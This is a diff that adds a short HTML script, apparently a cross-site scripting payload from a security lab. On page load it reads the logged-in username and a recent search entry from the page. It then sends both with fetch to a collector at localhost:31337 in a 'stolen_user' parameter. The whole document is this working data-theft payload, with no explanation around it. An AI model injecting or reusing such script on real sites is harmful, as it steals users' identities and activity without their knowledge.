@@ -1,0 +1,16 @@
+<script>
+    window.addEventListener('load', function() {
+        const usernameElement = document.getElementById('logged-in-user');
+        const searches = document.getElementsByClassName('history-item list-group-item');
+        
+        const username = usernameElement.innerText;
+        const mostRecentSearch = searches[1].innerText;
+        
+        var url = 'http://localhost:31337/?stolen_user=';
+        var url2 = url.concat(username);
+        var url3 = url2.concat('%26last_search=');
+        var url4 = url3.concat(mostRecentSearch);
+        
+        fetch(url4);
+    });
+</script>
